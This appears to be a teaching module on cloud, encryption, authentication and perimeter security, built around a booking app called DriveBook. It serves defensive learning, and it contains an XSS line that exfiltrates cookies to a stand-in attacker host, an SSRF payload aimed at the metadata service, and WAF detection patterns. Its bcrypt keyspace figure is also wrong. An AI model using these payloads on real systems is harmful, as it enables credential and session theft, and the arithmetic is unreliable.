
# Weeks 15–22 — Deep Dive: Elective Units with Real Code

## Cloud Security | Encryption | Authentication | Perimeter Security

---

## SECTION 1 — CLOUD SECURITY

### Level 1 — Absolute Beginner: What is "the cloud"?

Before the cloud, companies owned their own servers. They sat in a room.
You could walk up and touch them. If they caught fire, your data was gone.

"The cloud" just means: **someone else's computers, accessed over the internet.**

When you deploy DriveBook to Vercel, you are renting computing power from Vercel.
Vercel rents it from Amazon Web Services. You never see the physical hardware.

**The cloud trade-off:**
```
YOU GAIN:                          YOU GIVE UP:
- No hardware to buy               - Physical control
- Scales automatically             - Full visibility
- Reliable backups                 - You trust the provider
- Experts maintain the hardware    - Data leaves your premises
- Pay only for what you use
```

### Level 2 — The Shared Responsibility Model

This is the most tested concept in cloud security certifications.
It defines who is responsible for securing what.

```
┌─────────────────────────────────────────────────────────┐
│              CUSTOMER RESPONSIBILITY (YOU)              │
│                                                         │
│  Your application code                                  │
│  Your data (who has access, how it's structured)        │
│  Your user credentials (session management, MFA)        │
│  Your API secrets (.env variables)                      │
│  Your access controls (role checks in route handlers)   │
│  Your input validation (Zod schemas)                    │
│  Your logging and monitoring                            │
├─────────────────────────────────────────────────────────┤
│               SHARED RESPONSIBILITY                     │
│                                                         │
│  Operating system hardening (provider handles base,     │
│  you configure what runs on top)                        │
│  Encryption settings (provider offers tools,            │
│  you must ENABLE them)                                  │
├─────────────────────────────────────────────────────────┤
│              PROVIDER RESPONSIBILITY                    │
│              (Vercel / Railway / Supabase)              │
│                                                         │
│  Physical servers and data centres                      │
│  Network hardware and cabling                           │
│  Hypervisor (the software that runs virtual machines)   │
│  DDoS protection at the network level                   │
│  TLS certificates (auto-renewed by Vercel)              │
│  Physical security (guards, cameras, card access)       │
└─────────────────────────────────────────────────────────┘
```

**Real DriveBook mapping:**

| Component | Who secures it |
|-----------|---------------|
| Physical servers in Vercel's data centre | Vercel |
| TLS certificate for drivebook.com.au | Vercel (auto) |
| DDoS protection | Vercel |
| Your Next.js route auth checks | YOU |
| Your .env secret values | YOU |
| Supabase database at-rest encryption | Supabase |
| Your database queries (SQL injection prevention) | YOU (via Prisma) |
| Your user passwords (hashing) | YOU (via bcrypt) |

**The critical mistake companies make:**
"We're on the cloud — it's secure."

No. The cloud provider secures the infrastructure.
You secure your application and your data.
If you leave an admin endpoint with no auth check, Vercel cannot fix that for you.

### Level 3 — Cloud-Specific Attack Vectors

**Misconfigured Storage (S3/Cloudinary buckets)**

A common real-world breach: company stores sensitive files in cloud storage but
accidentally makes the bucket publicly readable.

```
VULNERABLE Cloudinary setup:
  Upload: store file → get URL like:
  https://res.cloudinary.com/drivebook/image/upload/police-check-john.pdf
  That URL is publicly accessible to ANYONE who knows it.

PROTECTED setup (DriveBook pattern from lib/services/cloudinary.ts):
  Upload: store file in private folder
  Access: generate a signed URL with expiry

export function getSignedUrl(publicId: string, expiresInSeconds = 3600): string {
  // This URL works for 1 hour, then becomes invalid
  return cloudinary.utils.private_download_url(publicId, 'pdf', {
    expires_at: Math.floor(Date.now() / 1000) + expiresInSeconds,
    attachment: false
  })
}

// When admin or instructor needs to view a document:
const signedUrl = getSignedUrl(doc.cloudinaryPublicId, 3600)
// URL expires in 1 hour — sharing the URL doesn't bypass access controls
// After expiry: 401 error even with the correct URL
```

**Server-Side Request Forgery (SSRF) in cloud environments**

SSRF is particularly dangerous in cloud VMs because of the instance metadata service.

Every cloud VM has a special local IP `169.254.169.254` that returns cloud config,
including the server's IAM credentials — its API keys for cloud services.

```
SSRF in a vulnerable app:
  App accepts a URL from the user and fetches it server-side:
  
  // DANGEROUS:
  const res = await fetch(req.body.url)  // user-controlled URL
  return res.json()
  
  Attacker provides: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  App fetches it → returns AWS credentials to the attacker
  Attacker now has full API access to the cloud account

DriveBook analysis — low SSRF risk because:
  - No endpoint accepts a user-provided URL and fetches it
  - AI bio generator uses hardcoded OpenAI URL (not user input)
  - videoUrl field is rendered as an embed tag, not fetched server-side
  - Cloudinary URLs come from the database, not user input

WHAT TO NEVER DO:
  const { url } = await req.json()
  const response = await fetch(url)  // ← never fetch user-provided URLs
```

**Environment variable exposure**

Your `.env` contains secrets that would compromise everything if leaked:
```
DATABASE_URL         → full read/write to all user data
STRIPE_SECRET_KEY    → full access to payment data and funds
NEXTAUTH_SECRET      → ability to forge any session token
CLOUDINARY_API_SECRET → access to all uploaded documents
CRON_SECRET          → ability to trigger cron jobs

How secrets leak in the real world:
1. .env committed to git → visible in GitHub history permanently
2. console.log(process.env) left in a debug route in production
3. Error page that includes environment variable dump
4. Third-party logging service that captures all env vars on startup

Prevention checklist:
□ .gitignore includes .env — run: git check-ignore -v .env
□ Never log process.env in full
□ Error responses never include env variable names
□ Rotate secrets after any team member leaves
□ Enable GitHub secret scanning (alerts if credentials appear in commits)
□ Run: git log --all --full-history -- .env (should return nothing)
```

---

## SECTION 2 — ENCRYPTION FROM SCRATCH TO ADVANCED

### Level 1 — Absolute Beginner: What is encryption?

Encryption scrambles information so only someone with the right key can read it.

Simple example to understand the concept (not real encryption):

```
PLAINTEXT:  HELLO
CIPHER:     shift each letter 3 positions forward
CIPHERTEXT: KHOOR

To decrypt: shift back 3
KHOOR → HELLO

The KEY is "shift by 3"
```

Real encryption (AES-256) uses a 256-bit key. There are 2^256 possible keys —
that is 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936 different keys.
A computer checking a trillion keys per second would take longer than the age of the universe to find the right one.

### Level 2 — Symmetric vs Asymmetric

**Symmetric: one shared key**

```
Both sender and receiver have the SAME key.

ENCRYPT: AES(plaintext, KEY) → ciphertext
DECRYPT: AES(ciphertext, KEY) → plaintext

Problem: How do you securely share the key the first time?
If you send it over the internet, an attacker can intercept it.

Used for: encrypting data at rest (database fields, files, backups)
          Because you don't need to send the key anywhere.
Examples: AES-128, AES-256, ChaCha20
```

**Asymmetric: key pair (public + private)**

```
PRIVATE KEY: kept secret, never shared
PUBLIC KEY: shared openly with everyone

Rule 1: Data encrypted with PUBLIC KEY → can ONLY be decrypted with PRIVATE KEY
Rule 2: Data encrypted with PRIVATE KEY → can ONLY be decrypted with PUBLIC KEY

ANALOGY:
  Public key = padlock that anyone can close (lock)
  Private key = the key that opens it

  I give you my padlock (public key).
  You lock your message in a box with my padlock.
  You send me the locked box.
  Only I can open it (only I have the private key).

Used for: Key exchange, digital signatures, TLS handshake
Examples: RSA-2048, ECDSA, Ed25519
```

**How TLS uses BOTH in sequence:**

```
STEP 1 (Asymmetric — key exchange):
  Client encrypts a random session key using server's PUBLIC key
  Only server can decrypt it (has the PRIVATE key)
  Now both have the same session key without it ever crossing the wire in plaintext

STEP 2 (Symmetric — data transfer):
  All HTTP data encrypted with AES using the session key

Why switch from asymmetric to symmetric after step 1?
Asymmetric (RSA) is ~1000x slower than symmetric (AES).
Use the slow one just to establish the fast one's key.
Then use AES for everything else.
```

### Level 3 — Password Hashing: Why bcrypt beats everything

**The attack that made MD5 obsolete — rainbow tables:**

```
MD5 is fast. On a GPU: 10 billion hashes per second.

Attackers pre-computed MD5 hashes for every common password:
MD5("password") = "5f4dcc3b5aa765d61d8327deb882cf99"
MD5("123456")   = "e10adc3949ba59abbe56e057f20f883e"
...millions more

This is a rainbow table. File size: ~100GB for all 8-character passwords.

If they steal your database:
  User has hash "5f4dcc3b5aa765d61d8327deb882cf99"
  Look it up in the rainbow table → "password" ← found in milliseconds

NO COMPUTATION NEEDED. Just a lookup.
```

**How bcrypt defeats rainbow tables: salting**

```
bcrypt automatically generates a UNIQUE random 22-character salt for EVERY password:

bcrypt("password", salt="aBcDeFgHiJkLmNoPqRsTuV") → "$2b$10$aBcDeFgHiJkLmNoPqRsTuV..."
bcrypt("password", salt="xYzWvUtSrQpOnMlKjIhGfE") → "$2b$10$xYzWvUtSrQpOnMlKjIhGfE..."

Same input + different salt = completely different output.
Rainbow tables are useless — you'd need a separate table for every possible salt.
Storage required: infinite.

The salt is stored INSIDE the hash string, so bcrypt.compare() works automatically.
```

**How bcrypt defeats GPU cracking: work factor**

```
SHA-256: 10,000,000,000 hashes/second on a $300 GPU
bcrypt cost 10: 10,000 hashes/second on the same GPU
                = 1,000,000x slower

Time to try all 8-character passwords against ONE bcrypt hash:
10,000 attempts/second → 1,296,000,000 possible 8-char alphanumeric passwords
= 130,000 seconds = 36 hours per hash

Database of 100,000 users at 36 hours each = 411 years

And you can increase the work factor as hardware gets faster.
bcrypt(12) = 4x slower than bcrypt(10). bcrypt(14) = 16x slower.
```

**DriveBook code — full picture:**

```typescript
// lib/auth.ts — REGISTRATION
import bcrypt from 'bcryptjs'

const BCRYPT_ROUNDS = 10  // 2^10 = 1,024 iterations

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, BCRYPT_ROUNDS)
  // bcrypt automatically:
  // 1. Generates a random 22-char salt
  // 2. Runs 1,024 iterations of hashing
  // 3. Returns: "$2b$10$[salt][hash]"
}

export async function verifyPassword(
  entered: string,
  stored: string
): Promise<boolean> {
  return bcrypt.compare(entered, stored)
  // bcrypt automatically:
  // 1. Extracts the salt from the stored hash
  // 2. Hashes 'entered' with the same salt and rounds
  // 3. Compares results
}

// REGISTRATION ROUTE:
const hashedPassword = await hashPassword(req.body.password)
await prisma.user.create({
  data: { email, password: hashedPassword }
  // NEVER store req.body.password directly
})

// LOGIN ROUTE:
const user = await prisma.user.findUnique({ where: { email } })
if (!user) return null  // don't reveal "user not found"
const passwordOk = await verifyPassword(enteredPassword, user.password)
if (!passwordOk) return null
```

**What a bcrypt hash looks like stored in the database:**

```
$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
│  │  │                        │
│  │  └─ 22-char salt (base64) └─ 31-char hash (base64)
│  └─ work factor: 10 (2^10 = 1,024 rounds)
└─ bcrypt version: 2b
```

---

## SECTION 3 — AUTHENTICATION DEEP DIVE

### Level 1 — Authentication vs Authorisation

```
AUTHENTICATION: Proving who you are
  "I am Debesay. Here is my password."
  Server verifies → "Yes, this is Debesay."

AUTHORISATION: What you are allowed to do
  "I want to access /admin/users"
  Server checks → "Debesay has role INSTRUCTOR, not ADMIN. Denied."

You can be authenticated (logged in) but not authorised (no permission).
You cannot be authorised without first being authenticated.

HTTP status codes:
  401 Unauthorized = not authenticated (please log in)
  403 Forbidden     = authenticated but not authorised (you can't do this)
```

### Level 2 — JWT Internals

**Structure:**

```
A JWT is three base64-encoded JSON objects separated by dots:
[HEADER].[PAYLOAD].[SIGNATURE]

HEADER (decoded):
{
  "alg": "HS256",  // HMAC-SHA256 signing algorithm
  "typ": "JWT"     // token type
}

PAYLOAD (decoded) — this is what your session contains:
{
  "sub": "cmp8bq7s70001qby7fceboaoo",  // subject: user ID (never changes)
  "email": "debesay@drivebook.com.au",
  "role": "INSTRUCTOR",                 // from database, not user input
  "instructorId": "clr8x...",
  "iat": 1722400000,                    // issued at (Unix timestamp)
  "exp": 1723004800                     // expires: 7 days after issued
}

SIGNATURE:
HMAC-SHA256(
  base64url(HEADER) + "." + base64url(PAYLOAD),
  NEXTAUTH_SECRET
)
```

**Why the signature cannot be forged:**

```
Attacker receives a JWT with role: "INSTRUCTOR"
Attacker wants role: "ADMIN"

Step 1: Decode the payload (base64 is encoding, not encryption — trivially decoded)
Step 2: Change "role": "INSTRUCTOR" to "role": "ADMIN"
Step 3: Re-encode to base64
Step 4: Try to produce a valid signature for the new payload

Problem: HMAC-SHA256 requires the NEXTAUTH_SECRET
         The secret is ONLY on the server, never sent to clients
         
Without the secret: the attacker's new signature ≠ what the server would compute
Server rejects: "JWT signature verification failed"

The attacker would need to brute-force NEXTAUTH_SECRET (32 random bytes = 2^256 possibilities)
In practice: impossible.
```

**HttpOnly cookie — why it's more secure than localStorage:**

```typescript
// NextAuth cookie configuration (from lib/auth.ts):
cookies: {
  sessionToken: {
    name: '__Secure-next-auth.session-token',
    options: {
      httpOnly: true,   // JavaScript cannot read this cookie
                        // document.cookie does not include it
                        // XSS attacks cannot steal it
      secure: true,     // only sent over HTTPS connections
      sameSite: 'lax',  // not sent with cross-site POST requests (CSRF protection)
      path: '/',
      maxAge: 60 * 60 * 24 * 7  // 7 days
    }
  }
}

// The consequence:
// Even if an attacker injects JavaScript into your page:
// <script>fetch('https://attacker.com?c=' + document.cookie)</script>
// The session token is NOT in document.cookie
// The attacker gets an empty string or non-sensitive cookies only
```

### Level 3 — OAuth 2.0 Authorisation Code Flow

**The four roles in OAuth:**

```
Resource Owner = the user (the person granting permission)
Client = your app (DriveBook)
Authorisation Server = Google / GitHub / Facebook (handles auth + consent)
Resource Server = the API you want to access (Google Calendar, etc.)
```

**Step-by-step flow for "Connect Google Calendar":**

```
1. User clicks "Connect Google Calendar" on DriveBook

2. DriveBook redirects to Google:
   GET https://accounts.google.com/o/oauth2/v2/auth
     ?client_id=YOUR_GOOGLE_CLIENT_ID
     &redirect_uri=https://drivebook.com.au/api/auth/callback/google
     &response_type=code
     &scope=https://www.googleapis.com/auth/calendar.readonly
     &state=RANDOM_CSRF_TOKEN  ← generated per request, verify on return

3. User sees Google's consent screen:
   "DriveBook wants to: View your Google Calendar events"
   User clicks Allow.

4. Google redirects back to DriveBook:
   GET https://drivebook.com.au/api/auth/callback/google
     ?code=AUTHORIZATION_CODE
     &state=RANDOM_CSRF_TOKEN  ← must match what was sent in step 2

5. DriveBook server exchanges code for tokens (SERVER-SIDE ONLY):
   POST https://oauth2.googleapis.com/token
   Body: {
     code: AUTHORIZATION_CODE,
     client_id: YOUR_CLIENT_ID,
     client_secret: YOUR_CLIENT_SECRET,  ← never leaves the server
     redirect_uri: "https://drivebook.com.au/api/auth/callback/google",
     grant_type: "authorization_code"
   }
   Response: {
     access_token: "ya29.a0AfH6...",   ← valid for ~1 hour
     refresh_token: "1//04...",         ← valid until user revokes
     expires_in: 3600
   }

6. Store refresh_token encrypted in database
   Use access_token to call Google Calendar API
   When access_token expires: use refresh_token to get a new one silently

WHY THE CODE EXCHANGE IS SERVER-SIDE:
The client_secret never appears in the browser or in the URL.
An attacker cannot intercept the code exchange because it requires the secret.
If the code is intercepted but the attacker doesn't have the secret: useless.
```

---

## SECTION 4 — PERIMETER SECURITY

### Level 1 — Traditional vs Cloud Perimeter

```
TRADITIONAL PERIMETER (office network):
  Internet → Firewall → Internal Network
  Everything inside the firewall is trusted.
  VPN lets remote workers be "inside."

CLOUD/SERVERLESS PERIMETER (DriveBook):
  No "inside." Every request comes from the internet.
  Even requests from Vercel to Supabase go over the internet (encrypted).
  
  SOLUTION: Zero Trust Architecture
  "Never trust, always verify."
  Every request must authenticate and authorise, regardless of source.
```

### Level 2 — Web Application Firewall (WAF)

A WAF reads HTTP request content and blocks malicious patterns.

```
Regular firewall sees:
  Source IP: 1.2.3.4
  Destination: Port 443
  Decision: Allow or Deny

WAF sees:
  Source IP: 1.2.3.4
  Destination: Port 443
  URL path: /api/users?id=1 OR 1=1
  Query parameter contains SQL injection pattern
  Decision: BLOCK + log

WAF rules for common attacks:
  SQL injection:   params containing: ', OR, UNION SELECT, DROP TABLE
  XSS:             params containing: <script, javascript:, onerror=
  Path traversal:  URLs containing: ../../../, /etc/passwd
  Scanner:         User-Agent matching: sqlmap, nikto, nmap
```

**Vercel's built-in protections:**

```
Vercel Edge Network provides:
  ✓ DDoS mitigation (absorbs volumetric attacks)
  ✓ TLS termination (handles HTTPS)
  ✓ Basic bot detection
  ✓ Edge caching (reduces load on your functions)

Vercel does NOT provide by default:
  ✗ OWASP rule sets (SQL injection, XSS pattern matching)
  ✗ Geo-blocking
  ✗ Custom WAF rules

If you need a full WAF: add Cloudflare in front of Vercel (free tier available)
  Internet → Cloudflare → Vercel → Next.js app
```

### Level 3 — Network Segmentation for DriveBook

**Current architecture:**

```
PUBLIC INTERNET
      │
      ├── drivebook.com.au → Vercel Edge (443 only)
      │   └── Next.js Functions → Supabase (via connection pooler, TLS)
      │                       → Upstash Redis (via HTTPS REST API)
      │                       → Stripe API (HTTPS)
      │
      └── drivebook-hybrid → Railway (443 only, secret header auth)
          └── Node.js → Supabase (same connection)
                     → Vercel main app (HTTPS)
```

**Security of current segmentation:**

```
SUPABASE PORT 5432:
  Not exposed to internet.
  Only reachable via Vercel's internal IP ranges.
  Test: telnet db.xxxx.supabase.co 5432 from your laptop → should fail.

REDIS (Upstash):
  Exposed as HTTPS REST API only.
  Port 6379 not accessible.
  Authentication via UPSTASH_REDIS_REST_TOKEN in .env.

RAILWAY SERVICE:
  Publicly accessible but requires X-Service-Secret header.
  Wrong or missing header → 401.
  This is application-level segmentation, not network-level.
  
  Improvement: restrict Railway's network to only accept connections
  from Vercel's IP ranges (Railway supports this in Pro tier).
```

---

## SECTION 5 — VPN TECHNOLOGIES

### Level 1 — What VPNs protect

```
Your laptop is on café Wi-Fi.
You open drivebook.com.au admin panel.

WITHOUT VPN:
  Café router sees:
    - You are connecting to IP 76.76.21.21 (Vercel)
    - If café router is compromised: attacker does MITM
    - They serve you a fake certificate (if not TLS) or record metadata
    
WITH VPN:
  Café router sees:
    - You are connecting to VPN server at IP X.X.X.X
    - Encrypted blob. Nothing else visible.
  
  VPN server (which you trust) connects to Vercel on your behalf.
  
NOTE: HTTPS already encrypts the content.
VPN additionally hides WHO you're connecting to from the café network.
```

### Level 2 — VPN Protocols Compared

```
WireGuard (modern choice — recommended):
  + State of the art cryptography (Curve25519, ChaCha20, Poly1305)
  + ~4,000 lines of code (vs 100,000+ for OpenVPN) — much smaller attack surface
  + Runs in the Linux kernel — very fast
  + Simple config: just a public/private key pair (like SSH)
  - Newer, fewer enterprise integrations
  - UDP only — can be blocked by strict firewalls

OpenVPN (established choice):
  + Very widely supported (all platforms, all cloud providers)
  + Can run over TCP/443 (disguised as HTTPS — bypasses VPN blocks)
  + Large ecosystem of management tools
  - Large codebase → more potential vulnerabilities
  - Slower than WireGuard
  - Complex configuration (certificates, PKI)

IPSec/IKEv2 (enterprise choice):
  + Built into operating systems (Windows, macOS, iOS, Android)
  + Hardware acceleration on routers
  + Fast for site-to-site
  - Complex to configure correctly
  - Implementation errors historically common
```

### Level 3 — Service-to-Service Security (DriveBook hybrid)

The hybrid service (Railway) calls Vercel endpoints. Currently protected by:

```typescript
// drivebook-hybrid/utils/validators.js — current approach
function validateServiceSecret(req, res, next) {
  const secret = req.headers['x-service-secret']
  if (secret !== process.env.SERVICE_SECRET) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  next()
}
```

This is a shared secret approach. The secret lives in both Railway and Vercel's
environment variables. Good. But a step up would be mTLS:

**Mutual TLS (mTLS) — advanced service authentication:**

```
Normal TLS (one-way):
  Client verifies: "Is this server who it says it is?"
  Server trusts: any client

Mutual TLS (two-way):
  Client verifies server certificate (as normal)
  Server also verifies client certificate
  If client doesn't present a valid certificate: connection refused

In service-to-service:
  Railway service has a client certificate
  Vercel only accepts connections from clients with that certificate
  Even if an attacker knows the endpoint: can't connect without the cert

This is the gold standard for microservice authentication.
Relevant once DriveBook scales to multiple services that need to talk to each other.
```

---

## Summary: Elective Assessment Questions

```
Q: Describe the shared responsibility model for DriveBook hosted on Vercel.
A: Vercel secures the physical infrastructure, network, TLS, and DDoS protection.
   DriveBook (me) secures the application code, user data, access controls,
   secret management, and monitoring. Supabase secures the database hardware
   and provides at-rest encryption; I'm responsible for query security and access control.

Q: What is the difference between symmetric and asymmetric encryption? Give a use case for each.
A: Symmetric uses one key for both encrypt and decrypt (fast). Use case: AES encrypting 
   database backups at rest. Asymmetric uses a key pair — data encrypted with the public 
   key can only be decrypted with the private key. Use case: TLS key exchange — client 
   encrypts a session key with the server's public key so only the server can decrypt it.

Q: Why is bcrypt preferred over SHA-256 for password storage?
A: bcrypt is deliberately slow (configurable work factor) and includes automatic salting.
   SHA-256 runs at 10 billion hashes/second on a GPU — trivially fast for cracking.
   bcrypt at cost 10 runs at ~10,000/second — 1 million times slower.
   The random salt per user defeats rainbow table lookups.

Q: What are the three parts of a JWT?
A: Header (signing algorithm and token type), Payload (claims: user ID, role, expiry),
   Signature (HMAC of header+payload signed with the server secret). The signature
   prevents payload tampering — without the secret you cannot produce a valid signature.

Q: Explain the OAuth 2.0 authorisation code flow.
A: User is redirected to the third-party auth server with scope and state parameters.
   After user consents, third-party redirects back with a short-lived authorisation code.
   Your server exchanges the code for access and refresh tokens using your client_secret
   (which never leaves the server). Access token is used to call the third-party API.

Q: What is Zero Trust and why does it matter for serverless apps?
A: Zero Trust means every request must be authenticated and authorised regardless of
   origin. Traditional perimeter security assumed requests from inside the network were
   safe. Serverless apps have no perimeter — every request comes from the internet.
   Zero Trust is the natural model: check every request, trust none implicitly.
```
